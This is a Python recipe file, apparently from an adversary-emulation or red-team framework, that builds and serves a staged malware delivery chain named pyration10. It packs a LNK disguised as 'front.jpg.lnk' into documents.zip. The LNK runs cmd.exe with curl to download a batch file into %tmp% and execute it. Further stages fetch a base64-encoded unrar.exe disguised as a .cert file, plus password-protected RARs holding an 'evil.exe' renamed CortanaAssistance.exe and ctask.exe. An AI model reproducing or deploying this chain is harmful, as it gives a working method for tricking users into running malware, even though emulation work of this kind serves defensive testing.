from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar

from helpers import *
from model import AceFile, AceRoute


def pyration10() -> List[AceRoute]:
    routes = []

    domain = 'http://localhost:5000/pyration10/'
    #bat1Url = 'http://localhost:5000/pyration10/front.txt'
    #bat2Url = 'http://localhost:5000/pyration10/c.bat'

    # Payload: unrar.cert: unrar.exe base64 encoded
    unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
    unrarB64: AceStr = base64encode(unrar)
    serveHtml: AceRoute = AceRoute('/pyration10/unrar.cert', unrarB64)
    routes.append(serveHtml)

    # Payload: setup.rar: PW "2022": CortanaAssistance.exe
    evilexe: AceBytes = readFileContent('payloads/evil.exe')
    evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
    serveHtml: AceRoute = AceRoute('/pyration10/assist.rar', evilexeRar)
    routes.append(serveHtml)

    # Payload: assist.rar: PW "2022": ctask.exe
    evilExeFile: AceFile = makeAceFile('ctask.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
    serveHtml: AceRoute = AceRoute('/pyration10/setup.rar', evilexeRar)
    routes.append(serveHtml)
    
    # Payload: Fake JPG
    pic: AceBytes = readFileContent('/pyration10/front.jpg')
    serveHtml: AceRoute = AceRoute('/pyration10/front.jpg', pic)
    routes.append(serveHtml)

    # Stage 2: BAT
    template = getTemplate('recipes/pyration10/', 'stage2.bat')
    rendered = template.render(
        assistUrl=domain + 'assist.rar',
        setupUrl=domain + 'setup.rar',
        certUrl=domain + 'unrar.cert',
    )
    serveHtml: AceRoute = AceRoute('/pyration10/c.txt', rendered)
    routes.append(serveHtml)

    # Stage 1: BAT
    template = getTemplate('recipes/pyration10/', 'stage1.bat')
    rendered = template.render(
        batUrl=domain + 'c.txt',
        picUrl=domain + 'front.jpg',
    )
    stage1bat: AceFile = makeAceFile('front.bat', rendered)
    serveHtml: AceRoute = AceRoute('/pyration10/front.txt', rendered)
    routes.append(serveHtml)

    # Initial Vector: LNK
    lnkData: AceBytes = makeLnk(
        name = "front.jpg.lnk",
        target = "c:\\Windows\\System32\\cmd.exe",
        arguments = "/c curl -k \"{}\" -o \"%tmp%/front.bat\" & cmd /c \"%tmp%/front.bat\"".format(
            domain + 'front.txt',
        ),
    )
    lnkFile: AceFile = makeAceFile('front.jpg.lnk', lnkData)

    # Put LNK into a ZIP
    container: AceBytes = makeZip(
        files = [
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('documents.zip', container)
    serveHtml: AceRoute = AceRoute('/documents.zip', containerFile)
    routes.append(serveHtml)
    return(routes)
